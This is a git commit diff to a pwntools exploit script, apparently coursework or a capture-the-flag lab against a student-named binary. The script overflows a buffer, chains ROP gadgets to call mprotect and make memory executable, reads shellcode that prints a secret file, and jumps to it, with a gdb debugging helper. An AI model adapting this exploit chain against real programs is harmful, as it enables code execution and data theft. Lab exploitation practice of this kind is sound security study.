788dfc59d30e3beb396db7ebe5ca6e8fdb71d3e5
dedkuzmich <91969553+dedkuzmich@users.noreply.github.com>
2024-03-28 16:40:16 +0200

    With ASLR

--- mkr1/pwn_64.py
+++ mkr1/pwn_64.py
@@ -4,11 +4,10 @@ from pwn import *
 IP = "0.0.0.0"
 PORT = 0
 
-context.arch = "amd64"
-
+file_breakpoints = "breaks64.gdb"
 file_secret = "secret.txt"
 file_binary = "10100_ILIN_Mykola_64"
-file_breakpoints = "breaks64.gdb"
+context.binary = ELF(f"./{file_binary}")
 
 # GADGETS
 pop_rax = p64(0x449857)  # pop rax; ret
@@ -19,26 +18,18 @@ syscall = p64(0x485ac9)  # syscall; ret
 add_rax_rdi = p64(0x42a403)  # add rax, rdi; ret
 
 
-def run_local(debug = True, wsl2 = True):
-    p = process([f"./{file_binary}"])
+def run_locally(payload = False, debug = True):
+    context.aslr = not payload  # True for cyclic(), False for clean run
+    p = process([context.binary.path], env = {})
     pid = util.proc.pidof(p)[0]
-    if debug == False:
-        return p
-    if wsl2 == False:  # Debug in Linux
-        log.info(f"Waiting for GDB...\n"
-                 f"$ gdb -q -p {pid}")
-        pause()
-        return p
-
-    # Debug in WSL2
-    gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
-    log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
-
-    new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
-    wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
-    cmd = f"cmd.exe /c start {new_tab} {wsl}"
-    os.system(cmd)
-    util.proc.wait_for_debugger(pid)
+    if debug == True:
+        gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
+        log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
+        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
+        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
+        cmd = f"cmd.exe /c start {new_tab} {wsl}"
+        os.system(cmd)
+        util.proc.wait_for_debugger(pid)
     return p
 
 
@@ -91,7 +82,7 @@ def sys_mprotect(address, length, protection):
     num_mprotect = 10
     buf = b""
 
-    # rax = 10 = 0xa
+    # rax = 10 = 0xa, avoid "\n"
     buf += pop_rax
     buf += p64(9)
     buf += pop_rdi
@@ -123,25 +114,26 @@ def main():
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
     # Buffer overflow (with return address overwriting)
-    buf = b"A" * 336
+    buf = b"A" * 336  # rax before "cmp eax, 0x539"
     buf += p32(1337)
-    buf = buf.ljust(1672, b"B")
+    buf = buf.ljust(1672, b"B")  # rsp before "ret"
 
-    # mprotect()
+    # mprotect(): make RWX buffer for shellcode
     rwx_addr = 0x400000
     rwx_length = 1 * 0x1000  # Should be multiple of 0x1000 = 4096 bytes = 1 RAM page
-    rwx_mode = 7  # RWX = read | write | execute = 7
+    rwx_mode = 7  # 7 = read | write | execute = RWX
     buf += sys_mprotect(rwx_addr, rwx_length, rwx_mode)
 
-    # read()
+    # read(): read shellcode from STDIN & write it to RWX buffer
     stdin_fd = 0
     buf += sys_read(stdin_fd, rwx_addr, len(sc))
-    buf += p64(rwx_addr)  # Jump to RWX buffer
 
+    buf += p64(rwx_addr)  # Jump to shellcode
     find_bad_bytes(buf)
 
     # RUN PROCESS
-    p = run_local(debug = True, wsl2 = True)
+    # buf = cyclic(5000)
+    p = run_locally(payload = True, debug = False)
     # p = remote(IP, PORT)
 
     log.info("=== buffer")
